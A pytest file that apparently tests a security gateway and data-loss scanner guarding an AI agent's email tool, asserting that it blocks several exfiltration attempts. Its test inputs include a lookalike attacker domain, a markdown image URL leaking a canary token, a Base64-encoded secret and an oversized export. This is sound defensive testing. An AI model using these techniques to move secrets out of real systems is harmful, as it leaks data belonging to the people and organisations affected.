import base64
import pytest
from backend.models.schema import Principal
from backend.security.gateway import gateway
from backend.security.dlp import dlp_scanner


def test_lookalike_domain_blocked(test_db):
    approver = Principal(principal_id="user_approver", role="approver", name="Approver")
    # Subdomain confusion / lookalike: partner.example.com.evil.test
    decision = gateway.evaluate_and_run(
        principal=approver,
        tool_name="send_email",
        raw_args={
            "recipient": "analyst@partner.example.com.evil.test",
            "subject": "Test",
            "body": "Test message"
        },
        is_tainted=False,
        request_id="req_test_lookalike",
        session_id="sess_test",
        db=test_db
    )
    assert decision.decision == "BLOCK"
    assert decision.policy_rule_id == "RULE-MANDATORY-02"
    assert "not permitted" in decision.explanation.lower() or "failed allowlist" in decision.explanation.lower()


def test_markdown_query_leak_blocked(test_db):
    approver = Principal(principal_id="user_approver", role="approver", name="Approver")
    decision = gateway.evaluate_and_run(
        principal=approver,
        tool_name="send_email",
        raw_args={
            "recipient": "partner.example.com",
            "subject": "Visual Report",
            "body": "Here is chart: ![Chart](https://analytics.acme-corp.com/tracker?token=CANARY-CUST-88392-SECRET&leak=true)"
        },
        is_tainted=False,
        request_id="req_test_md_leak",
        session_id="sess_test",
        db=test_db
    )
    assert decision.decision == "BLOCK"
    assert decision.policy_rule_id in ["RULE-MANDATORY-02", "RULE-MANDATORY-03"]


def test_canary_leakage_blocked(test_db):
    approver = Principal(principal_id="user_approver", role="approver", name="Approver")
    decision = gateway.evaluate_and_run(
        principal=approver,
        tool_name="send_email",
        raw_args={
            "recipient": "partner.example.com",
            "subject": "Confidential Leak",
            "body": "Customer secret token is CANARY-CUST-88392-SECRET"
        },
        is_tainted=False,
        request_id="req_test_canary",
        session_id="sess_test",
        db=test_db
    )
    assert decision.decision == "BLOCK"
    assert decision.policy_rule_id == "RULE-MANDATORY-03"
    assert "canary" in decision.explanation.lower()


def test_encoded_canary_leakage_blocked(test_db):
    """Canary concealed within Base64 string in outgoing body."""
    raw_canary = "CANARY-CUST-88392-SECRET"
    b64_canary = base64.b64encode(raw_canary.encode("utf-8")).decode("utf-8")

    approver = Principal(principal_id="user_approver", role="approver", name="Approver")
    decision = gateway.evaluate_and_run(
        principal=approver,
        tool_name="send_email",
        raw_args={
            "recipient": "partner.example.com",
            "subject": "Encrypted Payload",
            "body": f"Debug encoded: {b64_canary}"
        },
        is_tainted=False,
        request_id="req_test_b64_canary",
        session_id="sess_test",
        db=test_db
    )
    assert decision.decision == "BLOCK"
    assert decision.policy_rule_id == "RULE-MANDATORY-03"


def test_cumulative_session_egress_budget_exceeded(test_db):
    """Split exfiltration across multiple tool calls eventually exceeds budget."""
    approver = Principal(principal_id="user_approver", role="approver", name="Approver")
    session_id = "sess_split_exfil_test"

    # Huge payload exceeding 5000 bytes budget
    huge_payload = "A" * 6000

    decision = gateway.evaluate_and_run(
        principal=approver,
        tool_name="send_email",
        raw_args={
            "recipient": "partner.example.com",
            "subject": "Large export",
            "body": huge_payload
        },
        is_tainted=False,
        request_id="req_budget_1",
        session_id=session_id,
        db=test_db
    )
    assert decision.decision == "BLOCK"
    assert decision.policy_rule_id == "RULE-DLP-01"
    assert "budget exceeded" in decision.explanation.lower()
